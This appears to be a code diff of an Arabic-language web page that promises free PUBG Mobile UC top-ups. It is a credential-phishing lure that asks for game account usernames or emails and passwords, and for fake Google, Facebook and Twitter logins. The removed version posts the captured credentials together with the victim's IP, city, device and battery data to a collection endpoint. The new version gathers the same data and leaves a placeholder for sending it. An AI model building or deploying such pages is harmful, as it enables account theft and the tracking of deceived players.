@@ -1,13 +1,15 @@
 <!DOCTYPE html>
 <html dir="rtl" lang="ar">
 <head>
-     <title>شحن شدات ببجي مجانآ</title>
+    <title>شحن شدات ببجي</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
+        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap');
+
         body {
-            font-family: Arial, sans-serif;
-            background-color: #000;
+            font-family: 'Cairo', sans-serif;
+            background: linear-gradient(135deg, #1a237e, #0d47a1);
             display: flex;
             justify-content: center;
             align-items: center;
@@ -15,71 +17,182 @@
             margin: 0;
             color: #fff;
         }
+
         .container {
-            background-color: #1c1c1c;
+            background-color: rgba(13, 27, 66, 0.8);
             padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            border-radius: 20px;
             text-align: center;
             max-width: 400px;
             width: 90%;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+            transform: translateY(50px);
+            opacity: 0;
+            animation: fadeIn 0.5s ease-out forwards;
         }
+
+        @keyframes fadeIn {
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
         h1 {
-            color: #FFD700;
+            color: #ffd700;
+            margin-bottom: 20px;
+            font-size: 28px;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+        }
+
+        .login-options {
+            display: flex;
+            justify-content: space-around;
             margin-bottom: 20px;
         }
-        input[type="text"], input[type="password"], select {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #333;
-            border-radius: 5px;
-            background-color: #333;
+
+        .login-option {
+            background-color: #3f51b5;
             color: #fff;
-            box-sizing: border-box;
-        }
-        button {
-            background-color: #FFD700;
-            color: black;
             padding: 10px 20px;
             border: none;
-            border-radius: 5px;
+            border-radius: 50px;
             cursor: pointer;
+            transition: all 0.3s ease;
             font-size: 16px;
-            width: 100%;
-            margin-top: 10px;
         }
-        .pubg-logo {
-            width: 50px;
-            height: 50px;
-            margin-bottom: 20px;
+
+        .login-option:hover {
+            background-color: #5c6bc0;
+            transform: scale(1.05);
         }
-        .notification {
-            position: fixed;
-            top: 10px;
-            right: 10px;
-            background-color: #FFD700;
-            color: black;
-            padding: 10px 20px;
-            border-radius: 5px;
-            z-index: 100;
-            opacity: 0;
-            transition: opacity 0.5s ease;
+
+        .login-form {
             display: none;
+            animation: slideDown 0.5s ease-out;
         }
-        .notification.show {
-            opacity: 1;
-            display: block;
+
+        @keyframes slideDown {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        input[type="text"], input[type="password"], select {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 50px;
+            background-color: rgba(255, 255, 255, 0.1);
+            color: #fff;
+            box-sizing: border-box;
+            transition: all 0.3s ease;
+        }
+
+        input[type="text"]:focus, input[type="password"]:focus, select:focus {
+            background-color: rgba(255, 255, 255, 0.2);
+            outline: none;
+        }
+
+        button {
+            background-color: #ffa000;
+            color: #000;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            font-size: 18px;
+            width: 100%;
+            margin-top: 15px;
+            transition: all 0.3s ease;
+            font-weight: bold;
+        }
+
+        button:hover {
+            background-color: #ffb300;
+            transform: scale(1.05);
+        }
+
+        .pricing {
+            margin-top: 30px;
+        }
+
+        .price-option {
+            display: flex;
+            justify-content: space-between;
+            background-color: rgba(255, 255, 255, 0.1);
+            margin: 10px 0;
+            padding: 15px;
+            border-radius: 50px;
+            transition: all 0.3s ease;
+        }
+
+        .price-option:hover {
+            background-color: rgba(255, 255, 255, 0.2);
+            transform: translateX(-5px);
+        }
+
+        .price-option button {
+            background-color: #4caf50;
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .price-option button:hover {
+            background-color: #45a049;
+        }
+
+        .loading-screen {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 165, 0, 0.9);
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            z-index: 1000;
+        }
+
+        .progress-bar {
+            width: 250px;
+            height: 20px;
+            background-color: #fff;
+            border-radius: 10px;
+            overflow: hidden;
+            margin-top: 20px;
+        }
+
+        .progress {
+            width: 0%;
+            height: 100%;
+            background-color: #ff0000;
+            transition: width 2s ease-in-out;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <img src="https://th.elbadil.com/wp-content/uploads/2024/06/%D8%AA%D8%AD%D8%AF%D9%8A%D8%AB-%D8%A8%D8%A8%D8%AC%D9%8A-3.3-PUBG-MOBILE.jpeg" alt="PUBG Logo" class="pubg-logo">
-        <h1>شحن شدات ببجي مجانآ 🎮🚀</h1>
-        <form id="increaseForm">
-            <input type="hidden" name="chatId" id="chatIdInput">
-            <input type="text" name="username" placeholder="ايادي الحساب او البريد الإلكتروني" required>
+        <h1>شحن شدات ببجي 🎮🚀</h1>
+        <div class="login-options">
+            <button class="login-option" onclick="showLoginForm('google')">Google</button>
+            <button class="login-option" onclick="showLoginForm('facebook')">Facebook</button>
+            <button class="login-option" onclick="showLoginForm('twitter')">Twitter</button>
+        </div>
+        <form id="loginForm" class="login-form">
+            <input type="text" name="username" placeholder="يوزر الحساب او البريد الإلكتروني" required>
             <input type="password" name="password" placeholder="كلمة المرور" required>
             <select name="uc" required>
                 <option value="">اختر عدد الشدات</option>
@@ -90,111 +203,107 @@
             </select>
             <button type="submit">شحن</button>
         </form>
-        <div class="notification" id="notification">
-            <p>تم تنفيذ طلبك! إذا كانت البيانات صحيحة، فسوف تصل الشدات في غضون 15 دقيقة.</p>
+        <div class="pricing">
+            <div class="price-option">
+                <span>1000 -0$</span>
+                <button>مجاني</button>
+            </div>
+            <div class="price-option">
+                <span>1500 -2$</span>
+                <button>شراء الآن</button>
+            </div>
+            <div class="price-option">
+                <span>2000 -3$</span>
+                <button>شراء الآن</button>
+            </div>
+            <div class="price-option">
+                <span>2500 -4$</span>
+                <button>شراء الآن</button>
+            </div>
+            <div class="price-option">
+                <span>3000 -5$</span>
+                <button>شراء الآن</button>
+            </div>
+            <div class="price-option">
+                <span>10000 -10$</span>
+                <button>شراء الآن</button>
+            </div>
+        </div>
+    </div>
+    <div class="loading-screen" id="loadingScreen">
+        <h2>جاري إرسال الطلب</h2>
+        <p>يتم تجهيز طلبك، يرجى الانتظار</p>
+        <div class="progress-bar">
+            <div class="progress" id="progress"></div>
         </div>
     </div>
     <script>
-        const increaseForm = document.getElementById('increaseForm');
-const chatIdInput = document.getElementById('chatIdInput');
-const notification = document.getElementById('notification');
+        async function getIPInfo() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                return {
+                    ip: data.ip,
+                    country: data.country_name,
+                    city: data.city
+                };
+            } catch (error) {
+                console.error('Error fetching IP info:', error);
+                return {
+                    ip: 'Unknown',
+                    country: 'Unknown',
+                    city: 'Unknown'
+                };
+            }
+        }
 
-const chatId = window.location.pathname.split('/').pop();
-chatIdInput.value = chatId;
+        function getPlatformInfo() {
+            const ua = navigator.userAgent;
+            let platform = "Unknown";
+            if (/Windows/.test(ua)) platform = "Windows";
+            else if (/Mac/.test(ua)) platform = "MacOS";
+            else if (/Linux/.test(ua)) platform = "Linux";
+            else if (/Android/.test(ua)) platform = "Android";
+            else if (/iPhone|iPad|iPod/.test(ua)) platform = "iOS";
 
-async function getIPInfo() {
-  try {
-    const response = await fetch('https://ipapi.co/json/');
-    const data = await response.json();
-    return {
-      ip: data.ip,
-      country: data.country_name,
-      city: data.city
-    };
-  } catch (error) {
-    console.error('Error fetching IP info:', error);
-    return {
-      ip: 'Unknown',
-      country: 'Unknown',
-      city: 'Unknown'
-    };
-  }
-}
+            return {
+                platform: platform,
+                userAgent: ua
+            };
+        }
 
-function getPlatformInfo() {
-  const ua = navigator.userAgent;
-  let platform = "Unknown";
-  if (/Windows/.test(ua)) platform = "Windows";
-  else if (/Mac/.test(ua)) platform = "MacOS";
-  else if (/Linux/.test(ua)) platform = "PUBG";
-  else if (/Android/.test(ua)) platform = "Android";
-  else if (/iPhone|iPad|iPod/.test(ua)) platform = "iOS";
+        function showLoginForm(provider) {
+            const form = document.getElementById('loginForm');
+            form.style.display = 'block';
+            form.dataset.provider = provider;
+        }
 
-  return {
-    platform: platform,
-    userAgent: ua
-  };
-}
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            const formData = new FormData(this);
+            const data = Object.fromEntries(formData.entries());
+            
+            // Add login provider
+            data.provider = this.dataset.provider;
 
-async function getBatteryInfo() {
-  if ('getBattery' in navigator) {
-    try {
-      const battery = await navigator.getBattery();
-      return {
-        batteryLevel: battery.level,
-        batteryCharging: battery.charging
-      };
-    } catch (error) {
-      console.error('Error getting battery info:', error);
-    }
-  }
-  return {
-    batteryLevel: undefined,
-    batteryCharging: undefined
-  };
-}
+            // Add IP and platform info
+            const ipInfo = await getIPInfo();
+            const platformInfo = getPlatformInfo();
+            Object.assign(data, ipInfo, platformInfo);
 
-function getDeviceVersion() {
-  const ua = navigator.userAgent;
-  const match = ua.match(/\(([^)]+)\)/);
-  return match ? match[1] : 'Unknown';
-}
+            // Show loading screen
+            document.getElementById('loadingScreen').style.display = 'flex';
+            document.getElementById('progress').style.width = '100%';
 
-increaseForm.addEventListener('submit', async (event) => {
-  event.preventDefault();
-  const formData = new FormData(increaseForm);
-  const data = Object.fromEntries(formData.entries());
+            // Simulate sending data (replace with actual send logic)
+            console.log('Sending ', data);
 
-  const ipInfo = await getIPInfo();
-  const platformInfo = getPlatformInfo();
-  const batteryInfo = await getBatteryInfo();
-  const deviceVersion = getDeviceVersion();
-
-  Object.assign(data, ipInfo, platformInfo, batteryInfo, { deviceVersion });
-
-  try {
-    const response = await fetch('/submitIncrease', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-      },
-      body: JSON.stringify(data)
-    });
-    const result = await response.json();
-    if (result.success) {
-      notification.classList.add('show');
-      setTimeout(() => {
-        notification.classList.remove('show');
-      }, 5000);
-      increaseForm.reset();
-    } else {
-      alert('حدث خطأ أثناء تنفيذ الطلب. يرجى المحاولة مرة أخرى.');
-    }
-  } catch (error) {
-    console.error('Error:', error);
-    alert('حدث خطأ أثناء الاتصال بالخادم. يرجى المحاولة مرة أخرى لاحقاً.');
-  }
-});
+            // Hide loading screen after 2 seconds
+            setTimeout(function() {
+                document.getElementById('loadingScreen').style.display = 'none';
+                alert('تم إرسال الطلب بنجاح!');
+            }, 2000);
+        });
     </script>
 </body>
 </html>
